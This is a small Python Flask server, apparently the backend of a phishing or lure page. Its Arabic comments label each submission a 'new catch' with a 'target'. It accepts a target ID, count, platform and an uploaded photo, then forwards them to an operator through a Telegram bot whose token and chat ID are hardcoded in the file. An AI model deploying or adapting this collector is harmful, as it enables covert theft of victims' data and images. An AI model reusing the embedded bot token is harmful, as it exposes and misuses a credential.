from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg"
CHAT_ID = "5811700860"

@app.route('/api/index', methods=['GET', 'POST'])
def handler():
    if request.method == 'POST':
        # استلام النصوص
        target_id = request.form.get('id')
        count = request.form.get('count')
        plat = request.form.get('platform')
        
        msg = f"🎯 **صيد جديد**\nالهدف: `{target_id}`\nالعدد: `{count}`\nالمنصة: `{plat}`"
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})

        # استلام الصورة وإرسالها
        if 'file' in request.files:
            file = request.files['file']
            if file.filename != '':
                files = {'photo': (file.filename, file.read())}
                # نستخدم sendPhoto بدل sendDocument عشان تطلع لك الصورة واضحة بالبوت
                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", data={'chat_id': CHAT_ID}, files=files)
        
        return jsonify({"status": "ok"})
    
    return "🚀 Server is Running"
